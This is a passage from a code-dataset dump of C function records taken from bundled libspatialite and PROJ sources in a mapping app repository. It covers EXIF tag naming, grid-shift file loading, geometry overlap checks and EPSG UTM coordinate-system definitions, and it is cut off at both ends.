\"TIFF/EPStandardID\";\n\t\tbreak;\n\t    case 0x9217:\n\t    case 0xA217:\n\t\tname = \"SensingMethod\";\n\t\tbreak;\n\t    case 0x923F:\n\t\tname = \"StoNits\";\n\t\tbreak;\n\t    case 0x927C:\n\t\tname = \"MakerNote\";\n\t\tbreak;\n\t    case 0x9286:\n\t\tname = \"UserComment\";\n\t\tbreak;\n\t    case 0x9290:\n\t\tname = \"SubSecTime\";\n\t\tbreak;\n\t    case 0x9291:\n\t\tname = \"SubSecTimeOriginal\";\n\t\tbreak;\n\t    case 0x9292:\n\t\tname = \"SubSecTimeDigitized\";\n\t\tbreak;\n\t    case 0xA000:\n\t\tname = \"FlashpixVersion\";\n\t\tbreak;\n\t    case 0xA001:\n\t\tname = \"ColorSpace\";\n\t\tbreak;\n\t    case 0xA002:\n\t\tname = \"ExifImageWidth\";\n\t\tbreak;\n\t    case 0xA003:\n\t\tname = \"ExifImageLength\";\n\t\tbreak;\n\t    case 0xA004:\n\t\tname = \"RelatedSoundFile\";\n\t\tbreak;\n\t    case 0xA005:\n\t\tname = \"Interoperability IFD Pointer\";\n\t\tbreak;\n\t    case 0xA20D:\n\t\tname = \"Noise\";\n\t\tbreak;\n\t    case 0xA211:\n\t\tname = \"ImageNumber\";\n\t\tbreak;\n\t    case 0xA212:\n\t\tname = \"SecurityClassification\";\n\t\tbreak;\n\t    case 0xA213:\n\t\tname = \"ImageHistory\";\n\t\tbreak;\n\t    case 0xA216:\n\t\tname = \"TIFF/EPStandardID\";\n\t\tbreak;\n\t    case 0xA300:\n\t\tname = \"FileSource\";\n\t\tbreak;\n\t    case 0xA301:\n\t\tname = \"SceneType\";\n\t\tbreak;\n\t    case 0xA302:\n\t\tname = \"CFAPattern\";\n\t\tbreak;\n\t    case 0xA401:\n\t\tname = \"CustomRendered\";\n\t\tbreak;\n\t    case 0xA402:\n\t\tname = \"ExposureMode\";\n\t\tbreak;\n\t    case 0xA403:\n\t\tname = \"WhiteBalance\";\n\t\tbreak;\n\t    case 0xA404:\n\t\tname = \"DigitalZoomRatio\";\n\t\tbreak;\n\t    case 0xA405:\n\t\tname = \"FocalLengthIn35mmFilm\";\n\t\tbreak;\n\t    case 0xA406:\n\t\tname = \"SceneCaptureType\";\n\t\tbreak;\n\t    case 0xA407:\n\t\tname = \"GainControl\";\n\t\tbreak;\n\t    case 0xA408:\n\t\tname = \"Contrast\";\n\t\tbreak;\n\t    case 0xA409:\n\t\tname = \"Saturation\";\n\t\tbreak;\n\t    case 0xA40A:\n\t\tname = \"Sharpness\";\n\t\tbreak;\n\t    case 0xA40B:\n\t\tname = \"DeviceSettingDescription\";\n\t\tbreak;\n\t    case 0xA40C:\n\t\tname = \"SubjectDistanceRange\";\n\t\tbreak;\n\t    case 0xA420:\n\t\tname = \"ImageUniqueID\";\n\t\tbreak;\n\t    };\n      }\n    l = strlen (name);\n    if (len > l)\n\tstrcpy (str, name);\n    else\n      {\n\t  memset (str, '\\0', len);\n\t  memcpy (str, name, len - 1);\n      }\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiaexif\\gaia_exif.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/************************************************************************/\n/*                          pj_gridinfo_free()                          */\n/************************************************************************/\n", "func_signal": "void pj_gridinfo_free( projCtx ctx, PJ_GRIDINFO *gi )", "code": "{\n    if( gi == NULL )\n        return;\n\n    if( gi->child != NULL )\n    {\n        PJ_GRIDINFO *child, *next;\n\n        for( child = gi->child; child != NULL; child=next)\n        {\n            next=child->next;\n            pj_gridinfo_free( ctx, child );\n        }\n    }\n\n    if( gi->ct != NULL )\n        nad_free( gi->ct );\n    \n    free( gi->gridname );\n    if( gi->filename != NULL )\n        free( gi->filename );\n\n    pj_dalloc( gi );\n}", "path": "AdvancedMap3D\\jni\\proj-4.8.0\\src\\pj_gridinfo.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* including GEOS */\n", "func_signal": "static int\nsplite_mbr_overlaps (gaiaGeomCollPtr g1, gaiaGeomCollPtr g2)", "code": "{\n/* checks if two MBRs do overlap */\n    if (g1->MaxX < g2->MinX)\n\treturn 0;\n    if (g1->MinX > g2->MaxX)\n\treturn 0;\n    if (g1->MaxY < g2->MinY)\n\treturn 0;\n    if (g1->MinY > g2->MaxY)\n\treturn 0;\n    return 1;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/************************************************************************/\n/*                       pj_gridinfo_init_gtx()                         */\n/*                                                                      */\n/*      Load a NOAA .gtx vertical datum shift file.                     */\n/************************************************************************/\n", "func_signal": "static int pj_gridinfo_init_gtx( projCtx ctx, FILE * fid, PJ_GRIDINFO *gi )", "code": "{\n    unsigned char header[40];\n    struct CTABLE *ct;\n    double      xorigin,yorigin,xstep,ystep;\n    int         rows, columns;\n\n    assert( sizeof(int) == 4 );\n    assert( sizeof(double) == 8 );\n    if( sizeof(int) != 4 || sizeof(double) != 8 )\n    {\n        pj_log( ctx, PJ_LOG_ERROR,\n                \"basic types of inappropraiate size in nad_load_gtx()\" );\n        pj_ctx_set_errno( ctx, -38 );\n        return 0;\n    }\n\n/* -------------------------------------------------------------------- */\n/*      Read the header.                                                */\n/* -------------------------------------------------------------------- */\n    if( fread( header, sizeof(header), 1, fid ) != 1 )\n    {\n        pj_ctx_set_errno( ctx, -38 );\n        return 0;\n    }\n\n/* -------------------------------------------------------------------- */\n/*      Regularize fields of interest and extract.                      */\n/* -------------------------------------------------------------------- */\n    if( IS_LSB )\n    {\n        swap_words( header+0, 8, 4 );\n        swap_words( header+32, 4, 2 );\n    }\n\n    memcpy( &yorigin, header+0, 8 );\n    memcpy( &xorigin, header+8, 8 );\n    memcpy( &ystep, header+16, 8 );\n    memcpy( &xstep, header+24, 8 );\n\n    memcpy( &rows, header+32, 4 );\n    memcpy( &columns, header+36, 4 );\n\n    if( xorigin < -360 || xorigin > 360 \n        || yorigin < -90 || yorigin > 90 )\n    {\n        pj_log( ctx, PJ_LOG_ERROR, \n                \"gtx file header has invalid extents, corrupt?\");\n        pj_ctx_set_errno( ctx, -38 );\n        return 0;\n    }\n\n/* -------------------------------------------------------------------- */\n/*      Fill in CTABLE structure.                                       */\n/* -------------------------------------------------------------------- */\n    ct = (struct CTABLE *) pj_malloc(sizeof(struct CTABLE));\n    strcpy( ct->id, \"GTX Vertical Grid Shift File\" );\n\n    ct->ll.lam = xorigin;\n    ct->ll.phi = yorigin;\n    ct->del.lam = xstep;\n    ct->del.phi = ystep;\n    ct->lim.lam = columns;\n    ct->lim.phi = rows;\n\n    /* some GTX files come in 0-360 and we shift them back into the\n       expected -180 to 180 range if possible.  This does not solve \n       problems with grids spanning the dateline. */\n    if( ct->ll.lam >= 180.0 )\n        ct->ll.lam -= 360.0;\n\n    if( ct->ll.lam >= 0.0 && ct->ll.lam + ct->del.lam * ct->lim.lam > 180.0 )\n    {\n        pj_log( ctx, PJ_LOG_DEBUG_MAJOR,\n                \"This GTX spans the dateline!  This will cause problems.\" );\n    }\n\n    pj_log( ctx, PJ_LOG_DEBUG_MINOR,\n            \"GTX %dx%d: LL=(%.9g,%.9g) UR=(%.9g,%.9g)\",\n            ct->lim.lam, ct->lim.phi,\n            ct->ll.lam, ct->ll.phi, \n            ct->ll.lam + (columns-1)*xstep, ct->ll.phi + (rows-1)*ystep);\n    \n    ct->ll.lam *= DEG_TO_RAD;\n    ct->ll.phi *= DEG_TO_RAD;\n    ct->del.lam *= DEG_TO_RAD;\n    ct->del.phi *= DEG_TO_RAD;\n    ct->cvs = NULL;\n\n    gi->ct = ct;\n    gi->grid_offset = 40;\n    gi->format = \"gtx\";\n\n    return 1;\n}", "path": "AdvancedMap3D\\jni\\proj-4.8.0\\src\\pj_gridinfo.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/************************************************************************/\n/*                          pj_gridinfo_init()                          */\n/*                                                                      */\n/*      Open and parse header details from a datum gridshift file       */\n/*      returning a list of PJ_GRIDINFOs for the grids in that          */\n/*      file.  This superceeds use of nad_init() for modern             */\n/*      applications.                                                   */\n/************************************************************************/\n", "func_signal": "PJ_GRIDINFO *pj_gridinfo_init( projCtx ctx, const char *gridname )", "code": "{\n    char \tfname[MAX_PATH_FILENAME+1];\n    PJ_GRIDINFO *gilist;\n    FILE \t*fp;\n    char\theader[160];\n\n    errno = pj_errno = 0;\n    ctx->last_errno = 0;\n\n/* -------------------------------------------------------------------- */\n/*      Initialize a GRIDINFO with stub info we would use if it         */\n/*      cannot be loaded.                                               */\n/* -------------------------------------------------------------------- */\n    gilist = (PJ_GRIDINFO *) pj_malloc(sizeof(PJ_GRIDINFO));\n    memset( gilist, 0, sizeof(PJ_GRIDINFO) );\n    \n    gilist->gridname = strdup( gridname );\n    gilist->filename = NULL;\n    gilist->format = \"missing\";\n    gilist->grid_offset = 0;\n    gilist->ct = NULL;\n    gilist->next = NULL;\n\n/* -------------------------------------------------------------------- */\n/*      Open the file using the usual search rules.                     */\n/* -------------------------------------------------------------------- */\n    strcpy(fname, gridname);\n    if (!(fp = pj_open_lib(ctx, fname, \"rb\"))) {\n        ctx->last_errno = 0; /* don't treat as a persistent error */\n        return gilist;\n    }\n\n    gilist->filename = strdup(fname);\n    \n/* -------------------------------------------------------------------- */\n/*      Load a header, to determine the file type.                      */\n/* -------------------------------------------------------------------- */\n    if( fread( header, sizeof(header), 1, fp ) != 1 )\n    {\n        fclose( fp );\n        pj_ctx_set_errno( ctx, -38 );\n        return gilist;\n    }\n\n    fseek( fp, SEEK_SET, 0 );\n\n/* -------------------------------------------------------------------- */\n/*      Determine file type.                                            */\n/* -------------------------------------------------------------------- */\n    if( strncmp(header + 0, \"HEADER\", 6) == 0 \n        && strncmp(header + 96, \"W GRID\", 6) == 0 \n        && strncmp(header + 144, \"TO      NAD83   \", 16) == 0 )\n    {\n        pj_gridinfo_init_ntv1( ctx, fp, gilist );\n    }\n    \n    else if( strncmp(header + 0, \"NUM_OREC\", 8) == 0 \n             && strncmp(header + 48, \"GS_TYPE\", 7) == 0 )\n    {\n        pj_gridinfo_init_ntv2( ctx, fp, gilist );\n    }\n\n    else if( strlen(gridname) > 4 \n             && (strcmp(gridname+strlen(gridname)-3,\"gtx\") == 0 \n                 || strcmp(gridname+strlen(gridname)-3,\"GTX\") == 0) )\n    {\n        pj_gridinfo_init_gtx( ctx, fp, gilist );\n    }\n\n    else if( strncmp(header + 0,\"CTABLE V2\",9) == 0 )\n    {\n        struct CTABLE *ct = nad_ctable2_init( ctx, fp );\n\n        gilist->format = \"ctable2\";\n        gilist->ct = ct;\n\n        pj_log( ctx, PJ_LOG_DEBUG_MAJOR, \n                \"Ctable2 %s %dx%d: LL=(%.9g,%.9g) UR=(%.9g,%.9g)\\n\",\n                ct->id, \n                ct->lim.lam, ct->lim.phi,\n                ct->ll.lam * RAD_TO_DEG, ct->ll.phi * RAD_TO_DEG,\n                (ct->ll.lam + (ct->lim.lam-1)*ct->del.lam) * RAD_TO_DEG, \n                (ct->ll.phi + (ct->lim.phi-1)*ct->del.phi) * RAD_TO_DEG );\n    }\n\n    else\n    {\n        struct CTABLE *ct = nad_ctable_init( ctx, fp );\n\n        gilist->format = \"ctable\";\n        gilist->ct = ct;\n\n        pj_log( ctx, PJ_LOG_DEBUG_MAJOR, \n                \"Ctable %s %dx%d: LL=(%.9g,%.9g) UR=(%.9g,%.9g)\\n\",\n                ct->id, \n                ct->lim.lam, ct->lim.phi,\n                ct->ll.lam * RAD_TO_DEG, ct->ll.phi * RAD_TO_DEG,\n                (ct->ll.lam + (ct->lim.lam-1)*ct->del.lam) * RAD_TO_DEG, \n                (ct->ll.phi + (ct->lim.phi-1)*ct->del.phi) * RAD_TO_DEG );\n    }\n\n    fclose(fp);\n\n    return gilist;\n}", "path": "AdvancedMap3D\\jni\\proj-4.8.0\\src\\pj_gridinfo.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* end GEOS_ADVANCED */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollOverlaps (gaiaGeomCollPtr geom1, gaiaGeomCollPtr geom2)", "code": "{\n/* checks if two Geometries do \"spatially overlaps\" */\n    int ret;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n\n/* quick check based on MBRs comparison */\n    if (!splite_mbr_overlaps (geom1, geom2))\n\treturn 0;\n\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSOverlaps (g1, g2);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* full EPSG initialization enabled */\n", "func_signal": "SPATIALITE_PRIVATE void\ninitialize_epsg_39 (int filter, struct epsg_defs **first, struct epsg_defs **last)", "code": "{\n/* initializing the EPSG defs list */\n    struct epsg_defs *p;\n    p = add_epsg_def (filter, first, last, 32418, \"epsg\", 32418,\n        \"WGS 72BE / UTM zone 18N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=18 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 18N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-75],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32418\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32419, \"epsg\", 32419,\n        \"WGS 72BE / UTM zone 19N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=19 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 19N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-69],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32419\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32420, \"epsg\", 32420,\n        \"WGS 72BE / UTM zone 20N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=20 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 20N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-63],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32420\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32421, \"epsg\", 32421,\n        \"WGS 72BE / UTM zone 21N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=21 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 21N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-57],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32421\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32422, \"epsg\", 32422,\n        \"WGS 72BE / UTM zone 22N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=22 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 22N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-51],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32422\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32423, \"epsg\", 32423,\n        \"WGS 72BE / UTM zone 23N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=23 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 23N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-45],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32423\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32424, \"epsg\", 32424,\n        \"WGS 72BE / UTM zone 24N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=24 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 24N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-39],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32424\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32425, \"epsg\", 32425,\n        \"WGS 72BE / UTM zone 25N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=25 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 25N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n   